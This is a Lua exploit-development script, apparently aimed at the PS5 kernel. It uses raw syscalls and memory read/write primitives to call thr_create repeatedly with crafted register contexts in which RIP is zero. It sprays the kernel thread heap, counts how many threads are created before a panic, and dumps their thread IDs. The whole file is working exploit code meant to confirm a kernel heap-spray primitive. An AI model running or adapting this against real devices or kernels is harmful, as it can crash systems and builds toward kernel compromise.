-- CRASH_CLASS: RISKY
-- PROBE 78b: Rapid thr_create heap spray — how many kernel threads before panic?
--
-- Context: Each thr_create(430) allocates ~1KB kernel struct thread from the
-- thread zone. TIDs are sequential. If we can create multiple threads before
-- the first one panics the kernel, we have kernel heap feng shui.
--
-- Strategy: Create threads as fast as possible in a loop. Each gets a unique
-- marker in RDI so we can identify which thread faulted. Count how many
-- succeed before the crash. Use valid RSP (our stack) but RIP=0 (will fault).

print("=== PROBE 78b: THR_CREATE HEAP SPRAY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_create = make_syscall(430)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive_ok, pid = canary()
print("[0] canary pid=" .. tostring(pid) .. " ok=" .. tostring(alive_ok))

-- Allocate per-thread resources
-- Each thread gets its own context and stack so they don't collide
local MAX_THREADS = 20
local ctxs = {}
local stacks = {}
local id_slots = {}
local tids = {}

for i = 1, MAX_THREADS do
    ctxs[i] = memory.alloc(0x600)
    stacks[i] = memory.alloc(0x4000)
    id_slots[i] = memory.alloc(0x10)
    zero(ctxs[i], 0x600)
    zero(stacks[i], 0x4000)
    zero(id_slots[i], 0x10)

    -- Context gates
    wq(ctxs[i] + 0x108, 0x480)
    wd(ctxs[i] + 0x0D0, 0)
    wq(ctxs[i] + 0x110, 0x10000)

    -- Registers: unique marker in RDI, valid stack, RIP=0
    wq(ctxs[i] + 0xF8, 0)                    -- RIP = 0 (will fault)
    wq(ctxs[i] + 0xE0, stacks[i] + 0x3FF0)  -- RSP = valid
    wq(ctxs[i] + 0x100, 0)                    -- RFLAGS
    wq(ctxs[i] + 0x48, uint64(0xBEEF0000 + i))  -- RDI = marker per thread
    wq(ctxs[i] + 0x50, uint64(i))             -- RSI = thread index

    -- Sentinel in id_slot
    wq(id_slots[i], uint64(string.format("0x%X%08X", 0xDEADDEAD, 0xDEADDEAD)))
end

print("[0] allocated " .. MAX_THREADS .. " thread contexts")
print("")

-- Rapid-fire thread creation
print("=== SPRAY START ===")
local created = 0
for i = 1, MAX_THREADS do
    print("[spray] creating thread " .. i .. "...")
    local ok, rv = pcall(function()
        return sc_thr_create(uint64(ctxs[i]), uint64(id_slots[i]), uint64(0))
    end)
    local tid = rq(id_slots[i])
    tids[i] = tid

    print("[spray] thread " .. i .. " ok=" .. tostring(ok) .. " rv=" .. tostring(rv) .. " tid=" .. q(tid))

    if not ok then
        print("[spray] PCALL FAILED at thread " .. i .. " — stopping spray")
        break
    end

    local rv_num = to_num(rv)
    if rv_num ~= 0 and rv_num ~= nil then
        print("[spray] NON-ZERO RETURN at thread " .. i .. " rv=" .. tostring(rv) .. " — stopping spray")
        break
    end

    created = created + 1

    -- Quick canary between threads
    local c_ok, c_pid = canary()
    if not c_ok then
        print("[spray] CANARY FAILED after thread " .. i .. " — system degrading")
        break
    end
    print("[spray] canary_" .. i .. " ok=" .. tostring(c_ok))
end

print("")
print("[result] created " .. created .. " threads before stopping")
print("")

-- Dump all TIDs
print("=== TID DUMP ===")
for i = 1, created do
    print("[tid] thread " .. i .. " = " .. q(tids[i]))
end
print("=== END TID DUMP ===")
print("")

-- Post-spray canaries
local ts = memory.alloc(16)

wq(ts, 0); wq(ts + 8, 100000000) -- 100ms
pcall(function() return make_syscall(240)(uint64(ts), uint64(0)) end)
local c1_ok, c1_pid = canary()
print("[post] canary_100ms ok=" .. tostring(c1_ok) .. " pid=" .. tostring(c1_pid))

wq(ts, 0); wq(ts + 8, 500000000) -- 500ms
pcall(function() return make_syscall(240)(uint64(ts), uint64(0)) end)
local c2_ok, c2_pid = canary()
print("[post] canary_600ms ok=" .. tostring(c2_ok) .. " pid=" .. tostring(c2_pid))

wq(ts, 2); wq(ts + 8, 0)
pcall(function() return make_syscall(240)(uint64(ts), uint64(0)) end)
local c3_ok, c3_pid = canary()
print("[post] canary_2600ms ok=" .. tostring(c3_ok) .. " pid=" .. tostring(c3_pid))

wq(ts, 5); wq(ts + 8, 0)
pcall(function() return make_syscall(240)(uint64(ts), uint64(0)) end)
local c4_ok, c4_pid = canary()
print("[post] canary_7600ms ok=" .. tostring(c4_ok) .. " pid=" .. tostring(c4_pid))

print("")
print("=== PROBE 78b COMPLETE ===")
print("If PS5 crashed: check which thread index was last created.")
print("If survived: " .. created .. " threads exist in kernel — heap spray primitive confirmed!")
print("=== PROBE 78b COMPLETE ===")
